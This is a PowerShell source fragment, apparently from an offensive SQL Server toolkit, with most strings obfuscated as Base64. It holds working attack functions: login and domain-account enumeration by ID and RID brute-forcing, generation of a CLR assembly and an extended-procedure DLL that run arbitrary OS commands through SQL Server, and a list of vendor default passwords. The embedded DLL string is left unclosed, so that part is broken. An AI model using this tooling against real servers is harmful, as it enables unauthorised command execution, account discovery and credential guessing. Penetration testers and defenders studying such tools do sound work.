        $null = $TblFuzzedLogins.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABsAGUATgBhAG0AZQA='))))
        if($GetPrincipalType)
        {
            $null = $TblFuzzedLogins.Columns.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABsAGUAVAB5AHAAZQA='))))
        }
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose -Message "$Instance : Enumerating principal names from $FuzzNum principal IDs.."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $Query = "
                SELECT 
                '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                n [PrincipalId], SUSER_NAME(n) as [PrincipleName]
                from ( 
                select top $FuzzNum row_number() over(order by t1.number) as N
                from   master..spt_values t1 
                       cross join master..spt_values t2
                ) a
                where SUSER_NAME(n) is not null"
        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $TblResults |
        % {
            $PrincipalName = $_.PrincipleName
            $PrincipalId = $_.PrincipalId
            if($GetPrincipalType)
            {
                $RoleCheckQuery = "EXEC master..sp_defaultdb '$PrincipalName', 'NOTAREALDATABASE1234ABCD'"
                $RoleCheckResults = Get-SQLQuery -Instance $Instance -Query $RoleCheckQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -ReturnError
                if (($RoleCheckResults -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBOAE8AVABBAFIARQBBAEwARABBAFQAQQBCAEEAUwBFACoA')))) -or ($RoleCheckResults -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBhAGwAdABlAHIAIAB0AGgAZQAgAGwAbwBnAGkAbgAqAA==')))))
                {
                    if($PrincipalName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcACoA'))))
                    {
                        $PrincipalType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAEEAYwBjAG8AdQBuAHQA')))
                    }
                    else
                    {
                        $PrincipalType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABMAG8AZwBpAG4A')))
                    }
                }
                else
                {
                    $PrincipalType = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABTAGUAcgB2AGUAcgAgAFIAbwBsAGUA')))
                }
            }
            if($GetPrincipalType)
            {
                $null = $TblFuzzedLogins.Rows.Add($ComputerName, $Instance, $PrincipalId, $PrincipalName, $PrincipalType)
            }
            else
            {
                $null = $TblFuzzedLogins.Rows.Add($ComputerName, $Instance, $PrincipalId, $PrincipalName)
            }
        }
    }
    End
    {
        $TblFuzzedLogins | ? -FilterScript {
            $_.PrincipleName.length -ge 2
        }
        if( -not $SuppressVerbose)
        {
            Write-Verbose -Message "$Instance : Complete."
        }
    }
}
Function  Get-SQLFuzzDomainAccount
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to start fuzzing with.')]
        [string]$StartId = 500,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Principal ID to stop fuzzing on.')]
        [string]$EndId = 1000,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set a custom domain for user enumeration. Typically used to target trusted domains.')]
        [string]$Domain,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblFuzzedAccounts = New-Object -TypeName System.Data.DataTable
    }
    Process
    {
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | ? -FilterScript {
            $_.Status -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAaQBiAGwAZQA=')))
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."                
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $Instance = $ServerInfo.Instance
        if(-not $Domain){
            $Domain = $ServerInfo.DomainName
        }
        Write-Verbose -Message "$Instance : Enumerating Active Directory accounts for the `"$Domain`" domain..."        
        $DomainGroup = "$Domain\Domain Admins"         
        $DomainGroupSid = Get-SQLQuery -Instance $Instance -Query "select SUSER_SID('$DomainGroup') as DomainGroupSid" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose            
        $DomainGroupSidBytes = $DomainGroupSid | select -Property domaingroupsid -ExpandProperty domaingroupsid       
        try{
            $DomainGroupSidString = [System.BitConverter]::ToString($DomainGroupSidBytes).Replace('-','').Substring(0,48)
        }catch{
            Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABwAHIAbwB2AGkAZABlAGQAIABkAG8AbQBhAGkAbgAgAGQAaQBkACAAbgBvAHQAIAByAGUAcwBvAGwAdgBlACAAYwBvAHIAcgBlAGMAdABsAHkALgA=')))
            return
        }
        $StartId..$EndId |
        % -Process {
            $PrincipalIDHex = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAeAB9AA=='))) -f $_
            $PrincipalIDHexPad1 = $PrincipalIDHex | measure -Character
            $PrincipalIDHexPad2 = $PrincipalIDHexPad1.Characters
            If([bool]($PrincipalIDHexPad2%2))
            {
                $PrincipalIDHexFix = "0$PrincipalIDHex"
            }
            $GroupsOfTwo = $PrincipalIDHexFix -split $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))) | ? -FilterScript {
                $_
            }
            $GroupsOfTwoR = $GroupsOfTwo | sort -Descending
            $PrincipalIDHexFix2 = $GroupsOfTwoR -join ''
            $PrincipalIDPad = $PrincipalIDHexFix2.PadRight(8,'0')
            $Rid = "0x$DomainGroupSidString$PrincipalIDPad"
            $Query = "SELECT    '$ComputerName' as [ComputerName],
                '$Instance' as [Instance],
                '$Rid' as [RID],
            SUSER_SNAME($Rid) as [DomainAccount]"
            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
            $DomainAccount = $TblResults.DomainAccount
            if($DomainAccount.length -ge 2)
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - RID $Rid ($_) resolved to: $DomainAccount"
                }
            }
            else
            {
                if( -not $SuppressVerbose)
                {
                    Write-Verbose -Message "$Instance : - RID $Rid ($_) resolved to: "
                }
            }
            $TblFuzzedAccounts = $TblFuzzedAccounts + $TblResults
        }
    }
    End
    {
        $TblFuzzedAccounts |
        select -Property ComputerName, Instance, DomainAccount -Unique |
        ? -FilterScript {
            $_.DomainAccount -notlike ''
        }
    }
}
Function Get-ComputerNameFromInstance
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance
    )
    If ($Instance)
    {
        $ComputerName = $Instance.split('\')[0].split(',')[0]
    }
    else
    {
        $ComputerName = $env:COMPUTERNAME
    }
    Return $ComputerName
}
Function  Get-SQLServiceLocal
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance.')]
        [string]$Instance,
       [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Filter for running services.')]
        [switch]$RunOnly,
                [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblLocalInstances = New-Object -TypeName System.Data.DataTable
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA=='))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBEAGkAcwBwAGwAYQB5AE4AYQBtAGUA'))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBOAGEAbQBlAA=='))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAdABoAA=='))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBBAGMAYwBvAHUAbgB0AA=='))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBTAHQAYQB0AGUA'))))
        $null = $TblLocalInstances.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAHIAbwBjAGUAcwBzAEkAZAA='))))
    }
    Process
    {
        $SqlServices = gwmi -Class win32_service |
        ? -FilterScript {
            $_.DisplayName -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABTAGUAcgB2AGUAcgAgACoA')))
        } |
        select -Property DisplayName, PathName, Name, StartName, State, SystemName, ProcessId
        $SqlServices |
        % -Process {
            $ComputerName = [string]$_.SystemName
            $DisplayName = [string]$_.DisplayName
            $ServState = [string]$_.State
            $CurrentInstance = $ComputerName
            $InstanceCheck = ($DisplayName[1..$DisplayName.Length] | ? {$_ -like '('}).count
            if($InstanceCheck) {
                $CurrentInstance = $ComputerName + '\' +$DisplayName.split('(')[1].split(')')[0]
                if($CurrentInstance -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBcAE0AUwBTAFEATABTAEUAUgBWAEUAUgA='))))
                {
                    $CurrentInstance = $ComputerName
                }
            }
            if($Instance -and $instance -notlike $CurrentInstance){
                return
            }
            if($RunOnly -and $ServState -notlike $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AbgBpAG4AZwA=')))){
                return    
            }
            if($_.ProcessId -eq 0){
                $ServiceProcessId = ""
            }else{
                $ServiceProcessId = $_.ProcessId
            }
            $null = $TblLocalInstances.Rows.Add(
                [string]$_.SystemName,
                [string]$CurrentInstance,
                [string]$_.DisplayName,
                [string]$_.Name,
                [string]$_.PathName,
                [string]$_.StartName,
                [string]$_.State,
                [string]$ServiceProcessId)            
        }
    }
    End
    {
        $LocalInstanceCount = $TblLocalInstances.rows.count
        if(-not $SuppressVerbose){
            Write-Verbose "$LocalInstanceCount local SQL Server services were found that matched the criteria."        
        }
        $TblLocalInstances 
    }
}
function Create-SQLFileCLRDll
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Procedure name.')]
        [string]$ProcedureName = "cmd_exec",  
        [Parameter(Mandatory = $false,
        HelpMessage = 'Directory to output files.')]
        [string]$OutDir = $env:temp, 
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set custom assembly name. It is random by default.')]
        [string]$AssemblyName, 
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set custom assembly class name. It is random by default.')]
        [string]$AssemblyClassName,    
        [Parameter(Mandatory = $false,
        HelpMessage = 'Set custom assembly method name. It is random by default.')]
        [string]$AssemblyMethodName,             
        [Parameter(Mandatory = $false,
        HelpMessage = 'Output name.')]
        [string]$OutFile = "CLRFile",
        [Parameter(Mandatory = $false,
        HelpMessage = 'Optional source DLL to convert to ascii hex.')]
        [string]$SourceDllPath
    )
    Begin
    {
        $SRCPath = $OutDir + '\' + $OutFile + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBjAHMAYwA=')))
        $DllPath = $OutDir + '\' + $OutFile + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBkAGwAbAA=')))
        $CommandPath = $OutDir + '\' + $OutFile + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB0AHgAdAA=')))
        if($SourceDllPath){
            $DllPath = $SourceDllPath
            $SRCPath = "NA"
        }
    }
    Process 
    {
        Write-Verbose "Target C#  File: $SRCPath" 
        Write-Verbose "Target DLL File: $DllPath"
        $ClassNameLength = (5..10 | Get-Random -count 1 )
        $MethodNameLength = (5..10 | Get-Random -count 1 )
        $AssemblyLength = (5..10 | Get-Random -count 1 )
        If(-not $AssemblyClassName){                                       
            $AssemblyClassName = (-join ((65..90) + (97..122) | Get-Random -Count $ClassNameLength | % {[char]$_}))
        }
        if(-not $AssemblyMethodName){
            $AssemblyMethodName = (-join ((65..90) + (97..122) | Get-Random -Count $MethodNameLength | % {[char]$_}))
        }
        If(-not $AssemblyName){
            $AssemblyName = (-join ((65..90) + (97..122) | Get-Random -Count $MethodNameLength | % {[char]$_}))
        }
        if (-not $SourceDllPath){
            $TemplateCmdExec = @"
            using System;
            using System.Data;
            using System.Data.SqlClient;
            using System.Data.SqlTypes;
            using Microsoft.SqlServer.Server;
            using System.IO;
            using System.Diagnostics;
            using System.Text;
            public partial class $AssemblyClassName
            {
            [Microsoft.SqlServer.Server.SqlProcedure]
            public static void $AssemblyMethodName (SqlString execCommand)
            {
            Process proc = new Process();
            proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
            proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();

                // Create the record and specify the metadata for the columns.
	            SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

	            // Mark the begining of the result-set.
	            SqlContext.Pipe.SendResultsStart(record);

                // Set values for each column in the row
	            record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

	            // Send the row back to the client.
	            SqlContext.Pipe.SendResultsRow(record);

	            // Mark the end of the result-set.
	            SqlContext.Pipe.SendResultsEnd();

            proc.WaitForExit();
            proc.Close();

            }
            };
"@
            Write-Verbose "Writing C# code to $SRCPath" 
            $TemplateCmdExec | Out-File $SRCPath
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGMAcwBjAC4AZQB4AGUALgAuAC4A'))) 
            $CSCPath = ls -Recurse $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVwBpAG4AZABvAHcAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AC4ATgBFAFQAXAA='))) -Filter "csc.exe" | sort fullname -Descending | select fullname -First 1 -ExpandProperty fullname
            if(-not $CSCPath){
                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAYwBzAGMALgBlAHgAZQAgAGYAbwB1AG4AZAAuAA==')))
                return
            }else{
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBzAGMALgBlAHgAZQAgAGYAbwB1AG4AZAAuAA==')))
            }
            $CurrentDirectory = pwd
            cd $OutDir
            $Command = "$CSCPath /target:library " + $SRCPath                   
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcABpAGwAaQBuAGcAIAB0AG8AIABkAGwAbAAuAC4ALgA=')))
            $Results = iex $Command
            cd $CurrentDirectory
        }
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAGEAYgBiAGkAbgBnACAAYgB5AHQAZQBzACAAZgByAG8AbQAgAHQAaABlACAAZABsAGwA'))) 
        if (-not $SourceDllPath){
            $ProcedureNameSp = "$ProcedureName"
            $stringBuilder = New-Object -Type System.Text.StringBuilder
            $stringBuilder.Append($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBSAEUAQQBUAEUAIABBAFMAUwBFAE0AQgBMAFkAIABbAA==')))) > $null
            $stringBuilder.Append($AssemblyName) > $null
            $stringBuilder.Append($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XQAgAEEAVQBUAEgATwBSAEkAWgBBAFQASQBPAE4AIABbAGQAYgBvAF0AIABGAFIATwBNACAACgAwAHgA')))) > $null
            $assemblyFile = resolve-path $DllPath
            $fileStream = [IO.File]::OpenRead($assemblyFile)
             while (($byte = $fileStream.ReadByte()) -gt -1) {
                $stringBuilder.Append($byte.ToString("X2")) > $null
            }
            $null = $stringBuilder.AppendLine($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBXAEkAVABIACAAUABFAFIATQBJAFMAUwBJAE8ATgBfAFMARQBUACAAPQAgAFUATgBTAEEARgBFAA=='))))
            $null = $stringBuilder.AppendLine("GO")
            $null = $stringBuilder.AppendLine("CREATE PROCEDURE [dbo].[$ProcedureNameSp] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [$AssemblyName].[$AssemblyClassName].[$AssemblyMethodName];")
            $null = $stringBuilder.AppendLine("GO")
            $null = $stringBuilder.AppendLine("EXEC[dbo].[$ProcedureNameSp] 'whoami'")        
            $null = $stringBuilder.AppendLine("GO")
            $MySQLCommand = $stringBuilder.ToString() -join ""
            $fileStream.Close()
            $fileStream.Dispose()
        }else{
            $stringBuilder = New-Object -Type System.Text.StringBuilder
            $null = $stringBuilder.AppendLine($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAtACAAQwBoAGEAbgBnAGUAIAB0AGgAZQAgAGEAcwBzAGUAbQBiAGwAeQAgAG4AYQBtAGUAIAB0AG8AIAB0AGgAZQAgAG8AbgBlACAAeQBvAHUAIAB3AGEAbgB0ACAAdABvACAAcgBlAHAAbABhAGMAZQA='))))  
            $null = $stringBuilder.AppendLine($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBMAFQARQBSACAAQQBTAFMARQBNAEIATABZACAAWwBUAEIARABdACAARgBSAE8ATQA='))))
            $null = $stringBuilder.Append($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgAwAHgA')))) 
            $assemblyFile = resolve-path $DllPath
            $fileStream = [IO.File]::OpenRead($assemblyFile)
             while (($byte = $fileStream.ReadByte()) -gt -1) {
                $stringBuilder.Append($byte.ToString("X2")) > $null
            }
            $null = $stringBuilder.AppendLine($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBXAEkAVABIACAAUABFAFIATQBJAFMAUwBJAE8ATgBfAFMARQBUACAAPQAgAFUATgBTAEEARgBFAA=='))))
            $null = $stringBuilder.Append("")
            $MySQLCommand = $stringBuilder.ToString() -join ""
            $fileStream.Close()
            $fileStream.Dispose()
        }
        Write-Verbose "Writing SQL to: $CommandPath"
        $MySQLCommand | Out-File $CommandPath 
        echo "C# File: $SRCPath"
        echo "CLR DLL: $DllPath"
        echo "SQL Cmd: $CommandPath"        
    }
    End 
    {
    }
}
function Create-SQLFileXpDll
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'Operating system command to run.')]
        [string]$Command,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Name of exported function.')]
        [string]$ExportName,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Dll file to write to.')]
        [string]$OutFile
    )
    $DllBytes64 = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('
    [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
    $BufferString = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('')))
    IF(-not($Command))
    {
        $CommandString = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBjAGgAbwAgAFQAaABpAHMAIABpAHMAIABhACAAdABlAHMAdAAuACAAPgAgAGMAOgBcAHQAZQBtAHAAXAB0AGUAcwB0AC4AdAB4AHQAIAAmACYAIABSAEUATQA=')))
    }
    else
    {
        $CommandString = "$Command && REM"
    }
    $BufferStringLen = $BufferString.Length
    $CommandStringLen = $CommandString.Length
    if ($CommandStringLen -gt $BufferStringLen)
    {
        Write-Warning -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABDAG8AbQBtAGEAbgBkACAAaQBzACAAdABvAG8AIABsAG8AbgBnACEA')))
        Break
    }
    else
    {
        $BuffLenDiff = $BufferStringLen - $CommandStringLen
        $NewBuffer = ' ' * $BuffLenDiff
        $CommandString = "$CommandString && REM $NewBuffer"
    }
    $CommandStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($CommandString)
    $S = [System.Text.Encoding]::ASCII.GetString($DllBytes)
    $Index = 0
    $Index = $S.IndexOf($BufferString)
    if(($Index -eq 0) -and ($Index -ne -1))
    {
        throw("Could not find string $BufferString !")
        Break
    }
    else
    {
        Write-Verbose -Message " Found buffer offset for command: $Index"
    }
    for ($i = 0; $i -lt $CommandStringBytes.Length; $i++)
    {
        $DllBytes[$Index+$i] = $CommandStringBytes[$i]
    }
    $ProcNameBuffer = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBWAEkATABFAFYASQBMAEUAVgBJAEwARQBWAEkATABFAFYASQBMAA==')))
    IF(-not($ExportName))
    {
        $ExportName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eABwAF8AZQB2AGkAbAA=')))
    }
    $ProcNameBufferLen = $ProcNameBuffer.Length
    $ExportNameLen = $ExportName.Length
    If ($ProcNameBufferLen -lt $ExportNameLen)
    {
        Write-Warning -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABUAGgAZQAgAGYAdQBuAGMAdABpAG8AbgAgAG4AYQBtAGUAIABpAHMAIAB0AG8AbwAgAGwAbwBuAGcAIQA=')))
        Break
    }
    else
    {
        $ProcBuffLenDiff = $ProcNameBufferLen - $ExportNameLen
        $ProcNewBuffer = '' * $ProcBuffLenDiff
    }
    $ProcIndex = 0
    $S2 = [System.Text.Encoding]::ASCII.GetString($DllBytes)
    $ProcIndex = $S2.IndexOf($ProcNameBuffer)
    if(($ProcIndex -eq 0) -and ($ProcIndex -ne -1))
    {
        throw("Could not find string $ProcNameBuffer!")
        Break
    }
    else
    {
        Write-Verbose -Message " Found buffer offset for function name: $ProcIndex"
    }
    $ExportNameBytes = ([system.Text.Encoding]::UTF8).GetBytes($ExportName)
    for ($i = 0; $i -lt $ExportNameBytes.Length; $i++)
    {
        $DllBytes[$ProcIndex+$i] = $ExportNameBytes[$i]
    }
    $NullOffset = $ProcIndex+$ExportNameLen
    Write-Verbose -Message " Found buffer offset for buffer: $NullOffset"
    $NullBytes = ([system.Text.Encoding]::UTF8).GetBytes($ProcNewBuffer)
    for ($i = 0; $i -lt $ProcBuffLenDiff; $i++)
    {
        $DllBytes[$NullOffset+$i] = $NullBytes[$i]
    }
    IF(-not($OutFile))
    {
        $OutFile = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBcAGUAdgBpAGwANgA0AC4AZABsAGwA')))
    }
    Write-Verbose -Message "Creating DLL $OutFile"
    Write-Verbose -Message " - Exported function name: $ExportName"
    Write-Verbose -Message " - Exported function command: `"$Command`""
    Write-Verbose -Message " - Manual test: rundll32 $OutFile,$ExportName"
    sc -Value $DllBytes -Encoding Byte -Path $OutFile
    Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAAtACAARABMAEwAIAB3AHIAaQB0AHQAZQBuAA==')))
    Write-Verbose -Message ' '
    Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBRAEwAIABTAGUAcgB2AGUAcgAgAE4AbwB0AGUAcwA=')))
    Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABlAHgAcABvAHIAdABlAGQAIABmAHUAbgBjAHQAaQBvAG4AIABjAGEAbgAgAGIAZQAgAHIAZQBnAGkAcwB0AGUAcgBlAGQAIABhAHMAIABhACAAUwBRAEwAIABTAGUAcgB2AGUAcgAgAGUAeAB0AGUAbgBkAGUAZAAgAHMAdABvAHIAZQBkACAAcAByAG8AYwBlAGQAdQByAGUALgAgAE8AcAB0AGkAbwBuAHMAIABiAGUAbABvAHcAOgA=')))
    Write-Verbose -Message " - Register xp via local disk: sp_addextendedproc `'$ExportName`', 'c:\temp\myxp.dll'"
    Write-Verbose -Message " - Register xp via UNC path: sp_addextendedproc `'$ExportName`', `'\\servername\pathtofile\myxp.dll`'"
    Write-Verbose -Message " - Unregister xp: sp_dropextendedproc `'$ExportName`'"
}
Function  Get-SQLServerLoginDefaultPw
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,
        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )
    Begin
    {
        $TblResults = New-Object -TypeName System.Data.DataTable
        $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA==')))) | Out-Null
        $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA==')))) | Out-Null
        $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA==')))) | Out-Null
        $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA==')))) | Out-Null 
        $TblResults.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFMAeQBzAEEAZABtAGkAbgA=')))) | Out-Null
        $DefaultPasswords = New-Object System.Data.DataTable
        $DefaultPasswords.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHMAdABhAG4AYwBlAA==')))) | Out-Null
        $DefaultPasswords.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA==')))) | Out-Null
        $DefaultPasswords.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA==')))) | Out-Null        
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAFMA'))),"ej","ej") | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAFQANwA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAGcAZQA=')))) | Out-Null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBPAE0AMgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBhAF8AYQBkAG0AaQBuAA==')))) | out-null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBSAEkAUwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBSAEkAUwA5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgBBAFIASQBTACEAMQBkAG0AOQBuACMA')))) | out-null
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBkAGUAcwBrAFYAYQB1AGwAdAA='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBkAGUAcwBrAFYAYQB1AGwAdABAADIANgAyADAAMAA=')))) | Out-Null      
        $DefaultPasswords.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBPAFMAQwBIAFMAUQBMAA=='))),"sa",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBQAFMAcwBxAGwAMQAyADMANAA1AA==')))) | Out-Null
